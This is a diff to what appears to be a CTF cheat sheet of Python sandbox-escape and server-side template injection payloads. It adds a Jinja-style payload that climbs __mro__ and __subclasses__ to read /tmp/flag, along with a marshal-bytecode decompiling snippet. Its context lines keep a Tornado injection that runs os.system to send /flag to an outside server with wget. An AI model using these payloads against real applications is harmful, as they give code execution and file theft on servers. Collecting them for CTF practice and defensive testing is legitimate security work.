@@ -22,6 +22,10 @@ bash
 # Tornado : https://ctftime.org/writeup/11519
 {{globals.__self__.exec("imp"+"ort o"+"s;o"+"s.system('cat /flag|xa"+"rgs wget http://my_server 80 --user-agent')")}}
 
+# Has a very high success rate : 
+{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40](\"/tmp/flag\").read() }}
+source : https://twitter.com/LooseSecurity/status/1115397520727973894
+
 ```
 
 
@@ -136,4 +140,13 @@ getattr(getattr(getattr((), dir([])[1]),'__base__'),dir(getattr(getattr(getattr(
 ```
 source : [https://www.floyd.ch/?p=584](https://www.floyd.ch/?p=584) 
 
-## 
+## DeObfucaste Marshal @DwiMulia
+
+```
+from sys import stdout
+from uncompyle6.main import decompile
+import marshal
+
+x = marshal.loads("<REDACTED BYTECODE>")
+decompile(2.7, x, stdout) 
+```
